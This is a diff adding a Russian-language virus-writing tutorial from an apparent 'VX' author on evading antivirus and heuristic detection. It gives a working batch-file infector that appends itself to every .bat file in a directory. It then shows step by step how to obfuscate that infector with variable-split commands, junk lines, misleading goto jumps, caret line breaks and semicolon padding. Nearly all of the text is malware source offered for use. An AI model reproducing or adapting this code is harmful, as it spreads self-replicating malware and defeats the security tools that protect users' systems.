@@ -1,0 +1,328 @@
+                    Обход Антивирусов и эвристического Анализа.
+                             VX BATCH LAB/DR RUSTAM
+
+И Так начнём.
+Имеется вирус и он обнаруживается АВ.
+
+#######################
+
+@echo off
+echo orgy > infect1.bat
+echo if [%%1]==[infect1.bat] goto DontBother > infect2.bat
+echo if [%%1]==[infect2.bat] goto DontBother >> infect2.bat
+echo copy %%1 + infect1.bat %%1 >> infect2.bat
+echo attrib +r %%1 >> infect2.bat
+echo :DontBother >> infect2.bat
+attrib +r infect1.bat
+attrib +r infect2.bat
+for %%f in (*.bat) do call infect2 %%f
+attrib -r infect1.bat
+attrib -r infect2.bat
+del infect1.bat
+del infect2.bat
+
+##########################
+
+1.Меняем метки и имена файлов.
+Получаем.
+
+##########################
+
+@echo off
+echo DGH > RUM1.bat
+echo if [%%1]==[RUM1.bat] goto CTX > RUM2.bat
+echo if [%%1]==[RUM2.bat] goto CTX >> RUM2.bat
+echo copy %%1 + RUM1.bat %%1 >> RUM2.bat
+echo attrib +r %%1 >> RUM2.bat
+echo :CTX >> RUM2.bat
+attrib +r RUM1.bat
+attrib +r RUM2.bat
+for %%f in (*.bat) do call RUM2 %%f
+attrib -r RUM1.bat
+attrib -r RUM2.bat
+del RUM.bat
+del RUM2.bat
+
+##########################
+
+Уже на этом этапе отвалятся детекты у некоторых АВ.
+ИЗМЕНЕНИЯ БУДУТ КАПСОМ ДЛЯ ТОГО ЧТОБЫ БЫЛО ВИДНО ЧТО ИЗМЕНИЛОСЬ.
+
+2.Нужно заменить 'bat' на что нибудь менее приметное.
+Делаем это через 'Set'.
+
+############################
+
+@echo off
+SET #U=BAT
+echo DGH > RUM1.%#U%
+echo if [%%1]==[RUM1.%#U%] goto CTX > RUM2.%#U%
+echo if [%%1]==[RUM2.%#U%] goto CTX >> RUM2.%#U%
+echo copy %%1 + RUM1.%#U% %%1 >> RUM2.%#U%
+echo attrib +r %%1 >> RUM2.%#U%
+echo :CTX >> RUM2.%#U%
+attrib +r RUM1.%#U%
+attrib +r RUM2.%#U%
+for %%f in (*.%#U%) do call RUM2 %%f
+attrib -r RUM1.%#U%
+attrib -r RUM2.%#U%
+del RUM.%#U%
+del RUM2.%#U%
+
+############################
+
+3.Дальше больше. 
+Команды 'del'  'copy' 'attrib' 'for' тоже нужно замаскировать.
+Но использовать будем не 'Set',
+A просто пустые переменные(прим. %СлучайныеСимволы%) 
+
+###########################
+
+@echo off
+SET #U=BAT
+echo DGH > RUM1.%#U%
+echo if [%%1]==[RUM1.%#U%] goto CTX > RUM2.%#U%
+echo if [%%1]==[RUM2.%#U%] goto CTX >> RUM2.%#U%
+echo c%JY#%o%JY#%py %%1 + RUM1.%#U% %%1 >> RUM2.%#U%
+echo at%JY#%tr%JY#%ib +r %%1 >> RUM2.%#U%
+echo :CTX >> RUM2.%#U%
+%JY#%at%JY#%tri%JY#%b +r RUM1.%#U%
+a%JY#%t%JY#%tr%JY#%ib +r RUM2.%#U%
+f%JY#%o%JY#%r %%f in (*.%#U%) do call RUM2 %%f
+at%JY#%tr%JY#%ib -r RUM1.%#U%
+a%JY#%ttri%JY#%b -r RUM2.%#U%
+d%JY#%e%JY#%l RUM.%#U%
+d%JY#%e%JY#%l RUM2.%#U%
+
+############################
+Уже смотрится очень красиво. Дальше больше....
+
+4.Добавим команды и строки не влияющие на работу.
+cls rem echo dir title
+И просто мусора. 
+После команды 'cls fdhfgkghkg' 
+После меток :METKA gkdhgkghkgdkd
+После >NUL.
+Mожно писать что угодно. На работу не влияет.
+
+############################
+
+@echo off
+TITLE %RANDOM%
+SET #U=BAT
+echo DGH > RUM1.%#U%
+CLS 
+echo if [%%1]==[RUM1.%#U%] goto CTX > RUM2.%#U%
+REM UDUFUDUFIF
+CLS REM CLS EXIT
+echo if [%%1]==[RUM2.%#U%] goto CTX >> RUM2.%#U%
+@ECHO. %RANDOM%
+echo c%JY#%o%JY#%py %%1 + RUM1.%#U% %%1 >> RUM2.%#U%
+echo at%JY#%tr%JY#%ib +r %%1 >> RUM2.%#U%
+DIR
+REM LUDODOSODODYO
+TITLE CVGFFHH%RANDOM%
+echo :CTX >> RUM2.%#U%
+CLS REM SLEEP
+ECHO YFDGJVFDUVFGKFFGHHC
+%JY#%at%JY#%tri%JY#%b +r RUM1.%#U%
+REM OYEIYOEOUFVHKKKGYJ
+a%JY#%t%JY#%tr%JY#%ib +r RUM2.%#U%
+ECHO DIR TIME CLS RANDOM TITLE
+f%JY#%o%JY#%r %%f in (*.%#U%) do call RUM2 %%f
+CLS ECHO NULL EXIT
+ECHO TITLE>NUL
+at%JY#%tr%JY#%ib -r RUM1.%#U%
+a%JY#%ttri%JY#%b -r RUM2.%#U%
+DIR
+d%JY#%e%JY#%l RUM.%#U%
+d%JY#%e%JY#%l RUM2.%#U%
+CLS CLS ECHO TITLE NUL
+
+###########################
+
+5. Продолжаем извращения.
+Добавим меток и переходов 'goto' 'Запутаем все и вся.
+Межу  меток можно вставить команды которые не выполнятся никогда.
+Типо анти эвристика.
+
+##########################
+
+@echo off
+GOTO ZZ
+EXIT /B 000001
+:FF
+TITLE %RANDOM%
+SET #U=BAT
+GOTO TT
+ECHO............
+CLS
+:TT
+echo DGH > RUM1.%#U%
+CLS 
+echo if [%%1]==[RUM1.%#U%] goto CTX > RUM2.%#U%
+REM UDUFUDUFIF
+CLS REM CLS EXIT
+GOTO HH
+OYSODODODODODODODIYDKYDODO
+:HH
+echo if [%%1]==[RUM2.%#U%] goto CTX >> RUM2.%#U%
+@ECHO. %RANDOM%
+echo c%JY#%o%JY#%py %%1 + RUM1.%#U% %%1 >> RUM2.%#U%
+echo at%JY#%tr%JY#%ib +r %%1 >> RUM2.%#U%
+GOTO RR
+DIR
+REM LUDODOSODODYO
+TITLE CVGFFHH%RANDOM%
+:RR
+echo :CTX >> RUM2.%#U%
+CLS REM SLEEP
+ECHO YFDGJVFDUVFGKFFGHHC
+%JY#%at%JY#%tri%JY#%b +r RUM1.%#U%
+REM OYEIYOEOUFVHKKKGYJ
+GOTO UU
+a%JY#%t%JY#%tr%JY#%ib +r RUM2.%#U%
+ECHO DIR TIME CLS RANDOM TITLE
+:UU
+f%JY#%o%JY#%r %%f in (*.%#U%) do call RUM2 %%f
+CLS ECHO NULL EXIT
+ECHO TITLE>NUL
+at%JY#%tr%JY#%ib -r RUM1.%#U%
+a%JY#%ttri%JY#%b -r RUM2.%#U%
+DIR
+d%JY#%e%JY#%l RUM.%#U%
+d%JY#%e%JY#%l RUM2.%#U%
+GOTO HH
+:ZZ
+CLS CLS ECHO TITLE NUL
+GOTO FF
+:HH
+
+########################
+
+6. Разиваем строки символ ^
+После ^ не должо быть пробелов.
+
+########################
+
+@echo off
+GOTO ZZ
+EXIT /B 000001
+:FF
+TITLE %RANDOM%
+SET #U=BAT
+GOTO TT
+ECHO............
+CLS
+:TT
+echo DGH > RUM1.%#U%
+CLS 
+echo if [%%1]==[RUM1.%#U%] goto ^
+CTX > RUM2.%#U%
+REM UDUFUDUFIF
+CLS REM CLS EXIT
+GOTO HH
+OYSODODODODODODODIYDKYDODO
+:HH
+echo if [%%1]==[RUM2.%#U%] goto ^
+CTX >> RUM2.%#U%
+@ECHO. %RANDOM%
+echo ^
+c%JY#%o%JY#%py ^
+%%1 + RUM1.%#U% %%1 >> RUM2.%#U%
+echo ^
+at%JY#%tr%JY#%ib +r %%1 >> RUM2.%#U%
+GOTO RR
+DIR
+REM LUDODOSODODYO
+TITLE CVGFFHH%RANDOM%
+:RR
+echo :CTX >> RUM2.%#U%
+CLS REM SLEEP
+ECHO YFDGJVFDUVFGKFFGHHC
+%JY#%at%JY#%tri%JY#%b +r RUM1.%#U%
+REM OYEIYOEOUFVHKKKGYJ
+GOTO UU
+a%JY#%t%JY#%tr%JY#%ib +r RUM2.%#U%
+ECHO DIR TIME CLS RANDOM TITLE
+:UU
+f%JY#%o%JY#%r %%f in (*.%#U%) do call RUM2 %%f
+CLS ECHO NULL EXIT
+ECHO TITLE>NUL
+at%JY#%tr%JY#%ib -r RUM1.%#U%
+a%JY#%ttri%JY#%b -r RUM2.%#U%
+DIR
+d%JY#%e%JY#%l RUM.%#U%
+d%JY#%e%JY#%l RUM2.%#U%
+GOTO HH
+:ZZ
+CLS CLS ECHO TITLE NUL
+GOTO FF
+:HH
+
+########################
+
+7. ;-Не влияет на код заминяет пробел.
+Также используется для рабияения строк.
+
+########################
+
+@echo off>NUL.CCCCCCCCCCC
+GOTO ZZ ;;;;;;;;;;;;;;;
+EXIT /B 000001
+:FF SSSSSSSSSSSSSSSSSSSS
+TITLE %RANDOM% ;;;;;;;;;;
+SET;;;;; #U=BAT
+;;;;GOTO TT
+ECHO............
+CLS CFNGFSGFJFGJFGJFJFGJ
+:TT ;;;;;;;;;;;;;;;;;;;;;
+echo DGH > RUM1.%#U%
+CLS ;;;;;;;;;;;;;;;;;;;;;;;;
+echo;;;;; if [%%1]==[RUM1.%#U%] goto ^
+CTX > RUM2.%#U% >NUL.HHHHHHHHHHH
+REM UDUFUDUFIF
+CLS REM CLS EXIT
+;;;;GOTO HH ;;;;;;;;;;;;;;;;;;;
+OYSODODODODODODODIYDKYDODO
+:HH ;;;;;;;;;;;;;;;;;FFFFFFFFFFF
+echo if [%%1]==[RUM2.%#U%] goto ^
+CTX >> RUM2.%#U%
+@ECHO. %RANDOM%
+echo ^
+;;;;;;;;;;;;;;;;;;;c%JY#%o%JY#%py ^
+%%1 + RUM1.%#U% %%1 >> RUM2.%#U%
+echo ^
+at%JY#%tr%JY#%ib +r %%1 >> RUM2.%#U%
+GOTO RR ;;;;;;;;;;;;;;;;;;;;;;;;;
+DIR;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+REM LUDODOSODODYO
+;;;;;;;;TITLE CVGFFHH%RANDOM%
+:RR оррарарао;;;;;;;;;;;;;;;;;
+;;;;;;;echo :CTX >> RUM2.%#U%
+CLS REM SLEEP
+ECHO YFDGJVFDUVFGKFFGHHC
+%JY#%at%JY#%tri%JY#%b +r RUM1.%#U%
+REM OYEIYOEOUFVHKKKGYJ
+GOTO UU ;;;;;;;;;;;;;;;;;;;;;
+a%JY#%t%JY#%tr%JY#%ib +r;;;;;;; RUM2.%#U%
+ECHO DIR TIME CLS RANDOM TITLE
+:UU VVVVVVVVVVVVVVVVVVVVVVVVVV
+f%JY#%o%JY#%r %%f in (*.%#U%) do call RUM2 %%f
+CLS ECHO NULL EXIT
+ECHO TITLE >NUL.DDDDDDDDDDDDDDDDDD
+;;;;;at%JY#%tr%JY#%ib -r RUM1.%#U%
+;;;;;a%JY#%ttri%JY#%b -r RUM2.%#U%
+DIR ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;d%JY#%e%JY#%l;;;;;;;;;;; RUM.%#U%
+;;;d%JY#%e%JY#%l;;;;;;;;;; RUM2.%#U%
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;GOTO HH
+:ZZ ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
+CLS;;;;;;;;;;;;;;; CLS ECHO TITLE NUL
+GOTO FF ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+:HH XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+########################
+
+
+:EOF
